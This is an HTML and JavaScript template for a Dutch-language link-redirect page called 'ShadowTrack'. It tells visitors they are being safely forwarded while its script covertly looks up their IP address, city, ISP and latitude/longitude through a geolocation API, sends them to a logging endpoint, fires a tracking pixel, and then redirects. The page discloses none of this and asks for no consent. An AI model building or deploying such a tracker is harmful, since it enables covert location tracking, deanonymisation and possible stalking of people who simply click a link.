<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body { margin:0; font-family:Inter, sans-serif; background:#090917; color:#fff; display:flex; min-height:100vh; align-items:center; justify-content:center; }
    .card { max-width:480px; width:100%; padding:28px; border-radius:24px; background:rgba(10,10,30,0.95); box-shadow:0 25px 80px rgba(0,0,0,0.35); text-align:center; }
    h1 { margin:0 0 14px; font-size:2rem; color:#00ff88; }
    p { margin:12px 0; opacity:0.88; }
    .countdown { margin:18px 0; font-size:3rem; color:#00ccff; }
    .target { word-break:break-all; color:#fff; opacity:0.85; }
    .status { margin-top:8px; font-size:0.95rem; color:#ccc; }
  </style>
</head>
<body>
  <div class="card">
    <h1>ShadowTrack</h1>
    <p>Je wordt veilig doorgestuurd naar de bestemmingspagina.</p>
    <div class="countdown" id="countdown">3</div>
    <div class="target" id="targetLink"></div>
    <p class="status" id="status">Even geduld...</p>
  </div>

  <script>
    const targetUrl = "{{DESTINATION_URL}}";
    const trackerId = "{{TRACKER_ID}}";
    document.getElementById('targetLink').textContent = targetUrl;

    async function sendLog() {
      let geo = { ip: 'Unknown', country: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: null, lon: null };
      try {
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
          const data = await response.json();
          geo = {
            ip: data.ip || geo.ip,
            country: data.country_name || geo.country,
            city: data.city || geo.city,
            isp: data.org || geo.isp,
            lat: data.latitude || null,
            lon: data.longitude || null
          };
        }
      } catch (err) {
        console.warn('Geo ophalen mislukt:', err);
      }

      const payload = {
        tracker_id: trackerId,
        ip: geo.ip,
        country: geo.country,
        city: geo.city,
        isp: geo.isp,
        lat: geo.lat,
        lon: geo.lon
      };
      try {
        if (navigator.sendBeacon) {
          const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
          navigator.sendBeacon('/api/log-geo', blob);
        } else {
          await fetch('/api/log-geo', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
        }
      } catch (err) {
        console.warn('Log naar server mislukt:', err);
      }

      fetch(`/pixel/${trackerId}.png`).catch(() => {});
    }

    async function beginRedirect() {
      await sendLog();
      let countdown = 3;
      const countdownEl = document.getElementById('countdown');
      const statusEl = document.getElementById('status');
      const timer = setInterval(() => {
        countdown -= 1;
        if (countdown <= 0) {
          clearInterval(timer);
          statusEl.textContent = 'Redirecting...';
          window.location.replace(targetUrl);
          return;
        }
        countdownEl.textContent = countdown;
        statusEl.textContent = `Doorsturen in ${countdown}...`;
      }, 1000);
    }

    beginRedirect();
  </script>
</body>
</html>
